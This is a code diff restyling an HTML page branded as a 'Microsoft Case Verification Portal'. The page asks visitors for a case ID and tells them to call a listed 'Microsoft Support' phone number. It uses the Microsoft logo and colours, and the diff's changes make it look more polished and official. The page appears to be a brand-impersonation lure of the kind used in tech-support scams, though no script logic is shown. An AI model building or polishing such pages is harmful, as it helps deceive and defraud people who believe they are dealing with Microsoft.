@@ -4,67 +4,91 @@
   <title>Microsoft Case Verification</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background-color: #f2f2f2;
       margin: 0;
       padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f4f6f9;
     }
-    .header, .footer {
+    .header {
       background-color: #ffffff;
       border-bottom: 1px solid #ccc;
-      padding: 15px 30px;
       display: flex;
       align-items: center;
       justify-content: space-between;
-    }
-    .footer {
-      border-top: 1px solid #ccc;
-      border-bottom: none;
-      font-size: 13px;
-      color: #666;
-      justify-content: center;
+      padding: 14px 30px;
     }
     .logo {
-      width: 140px;
+      height: 26px;
+    }
+    .header-title {
+      font-size: 17px;
+      font-weight: 600;
+      color: #444;
     }
     .container {
-      background-color: white;
-      padding: 40px;
+      max-width: 400px;
+      background-color: #ffffff;
+      margin: 80px auto;
+      padding: 40px 30px;
       border-radius: 10px;
-      display: inline-block;
-      box-shadow: 0 0 10px rgba(0,0,0,0.2);
-      margin-top: 60px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
       text-align: center;
     }
-    input, button {
-      padding: 10px;
+    h2 {
+      margin-bottom: 25px;
+      color: #0078d4;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 20px;
+      font-size: 15px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
       font-size: 16px;
-      width: 250px;
-      margin: 10px 0;
+      background-color: #0078d4;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background-color 0.2s ease-in-out;
+    }
+    button:hover {
+      background-color: #005ea6;
     }
     .support {
       margin-top: 30px;
       font-size: 14px;
-      color: #333;
+      color: #555;
+    }
+    .footer {
+      background-color: #ffffff;
+      text-align: center;
+      padding: 15px;
+      border-top: 1px solid #ccc;
+      font-size: 13px;
+      color: #666;
+      margin-top: 80px;
     }
   </style>
 </head>
 <body>
 
   <div class="header">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" class="logo" alt="Microsoft Logo">
-    <span style="font-weight: 600; font-size: 18px;">Microsoft Case Verification</span>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" class="logo">
+    <div class="header-title">Microsoft Case Verification Portal</div>
   </div>
 
-  <div style="text-align: center;">
-    <div class="container">
-      <h2>Case ID Verification</h2>
-      <input type="text" id="caseId" placeholder="Enter Case ID">
-      <br>
-      <button onclick="verifyCase()">Continue</button>
-      <div class="support">
-        Support: +1 206 279 9715
-      </div>
+  <div class="container">
+    <h2>Case ID Verification</h2>
+    <input type="text" id="caseId" placeholder="Enter your Case ID">
+    <button onclick="verifyCase()">Continue</button>
+    <div class="support">
+      For help, call Microsoft Support: <br><strong>+1 206 279 9715</strong>
     </div>
   </div>
 
